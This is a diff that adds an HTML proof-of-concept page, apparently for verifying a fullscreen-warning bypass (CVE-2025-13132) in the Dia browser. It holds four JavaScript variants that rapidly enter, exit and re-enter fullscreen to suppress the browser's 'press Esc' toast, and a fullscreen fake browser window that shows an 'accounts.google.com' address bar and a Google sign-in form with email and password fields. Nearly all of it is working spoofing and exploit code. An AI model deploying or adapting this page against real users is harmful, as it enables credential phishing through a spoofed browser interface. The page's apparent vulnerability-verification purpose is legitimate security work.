@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Dia CVE-2025-13132 — toast-dedup bypass (verify)</title>
+<style>
+ body{font-family:system-ui;margin:24px;max-width:820px;line-height:1.45}
+ button{display:block;width:100%;text-align:left;margin:8px 0;padding:12px;border:1px solid #ccc;border-radius:8px;background:#fafafa;cursor:pointer;font-size:14px}
+ button:hover{background:#eef}
+ #log{white-space:pre-wrap;background:#111;color:#0f0;padding:10px;border-radius:8px;font-size:12px;min-height:60px;margin-top:10px}
+ .note{color:#666;font-size:13px}
+ #fake{position:fixed;inset:0;display:none;background:#fff;z-index:2147483647;flex-direction:column}
+ :fullscreen #fake,:-webkit-full-screen #fake{display:flex}
+ #fake .bar{background:#2b2d31;display:flex;align-items:center;gap:10px;padding:9px 14px}
+ #fake .dot{width:12px;height:12px;border-radius:50%}
+ #fake .addr{flex:1;background:#1e1f22;color:#e3e3e3;border-radius:8px;padding:8px 16px;font-size:14px}
+ #fake .addr b{color:#7ee787}
+ #fake .page{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center}
+ #fake input{width:340px;max-width:80%;padding:12px;margin:6px;border:1px solid #dadce0;border-radius:6px}
+ #status{position:fixed;top:6px;right:8px;background:#000;color:#0f0;font:12px ui-monospace;padding:4px 8px;border-radius:6px;z-index:2147483647}
+</style></head><body>
+<h2>CVE-2025-13132 — toast-dedup bypass (self-verifying)</h2>
+<p class="note">Dia ≥1.6. Click a variant. Watch (1) does the <b>"ajaone.github.io … press Esc" toast</b> appear?
+and (2) the <b>green status badge</b> top-right — it shows <code>FS:&lt;tag&gt;</code> when you ARE in fullscreen.
+<br>🔴 <b>BYPASS</b> = badge shows <code>FS:DIV</code> (you're fullscreen, fake UI fills screen) <b>AND no toast appeared</b>.</p>
+
+<button onclick="v1()">V1 — enter → (on change) exit → (on change) re-enter [event-driven, keeps transitioning]</button>
+<button onclick="v2()">V2 — call requestFullscreen() TWICE in the same click (sync double-call)</button>
+<button onclick="v3()">V3 — enter on tiny elem, then enter on fake-UI WITHOUT exiting (transition)</button>
+<button onclick="v4()">V4 — original H, but re-enter inside a 0ms microtask (preserve gesture)</button>
+<div id="log"></div>
+
+<div id="status">FS:none</div>
+<div id="fake">
+ <div class="bar"><span class="dot" style="background:#ff5f57"></span><span class="dot" style="background:#febc2e"></span><span class="dot" style="background:#28c840"></span>
+   <div class="addr">🔒 <b>accounts.google.com</b>/signin/v2/identifier</div></div>
+ <div class="page"><div style="font-size:22px;color:#5f6368">Google</div><h2 style="font-weight:400">Sign in</h2>
+   <input placeholder="Email or phone"><br><input type="password" placeholder="Password"><br>
+   <button style="background:#1a73e8;color:#fff;border:0;padding:10px 24px;border-radius:6px">Next</button>
+   <p id="verdict" style="color:#b00;font-size:13px"></p></div>
+</div>
+<span id="tiny" style="position:fixed;left:-9999px;width:1px;height:1px"></span>
+
+<script>
+const FAKE=document.getElementById('fake'), TINY=document.getElementById('tiny');
+function log(m){const l=document.getElementById('log');l.textContent+=m+'\n';}
+function rfs(el){return el.requestFullscreen?el.requestFullscreen():el.webkitRequestFullscreen&&el.webkitRequestFullscreen();}
+function xfs(){return document.exitFullscreen?document.exitFullscreen():document.webkitExitFullscreen&&document.webkitExitFullscreen();}
+function fsel(){return document.fullscreenElement||document.webkitFullscreenElement||null;}
+document.addEventListener('fullscreenchange',upd);document.addEventListener('webkitfullscreenchange',upd);
+function upd(){const e=fsel();document.getElementById('status').textContent='FS:'+(e?e.tagName:'none');
+  if(e===FAKE){document.getElementById('verdict').textContent='[BYPASS?] You are FULLSCREEN. If NO toast appeared → CVE-2025-13132 bypass.';}
+  log('  fullscreenchange → FS:'+(e?e.tagName:'none'));}
+
+function v1(){log('V1 event-driven re-enter');let p=0;
+  function h(){const e=fsel();
+    if(e&&p===0){p=1;log('  entered; exiting…');xfs();}
+    else if(!e&&p===1){p=2;log('  exited; re-entering…');document.removeEventListener('fullscreenchange',h);
+      Promise.resolve(rfs(FAKE)).then(()=>log('  re-enter ok')).catch(err=>log('  re-enter REJECTED: '+err));}
+  }
+  document.addEventListener('fullscreenchange',h);rfs(FAKE);}
+
+function v2(){log('V2 sync double-call');try{rfs(FAKE);}catch(e){}try{rfs(FAKE);}catch(e){}}
+
+function v3(){log('V3 transition tiny→fake (no exit)');
+  Promise.resolve(rfs(TINY)).then(()=>{log('  tiny fullscreen (toast for tiny?). switching to fake in 200ms…');
+    setTimeout(()=>{Promise.resolve(rfs(FAKE)).then(()=>log('  switched to fake — new toast?')).catch(e=>log('  switch rejected: '+e));},200);})
+   .catch(e=>log('  tiny rfs rejected: '+e));}
+
+function v4(){log('V4 microtask re-enter');
+  Promise.resolve(rfs(FAKE)).then(()=>{xfs();
+    Promise.resolve().then(()=>{Promise.resolve(rfs(FAKE)).then(()=>log('  microtask re-enter ok')).catch(e=>log('  rejected: '+e));});});}
+</script>
+</body></html>
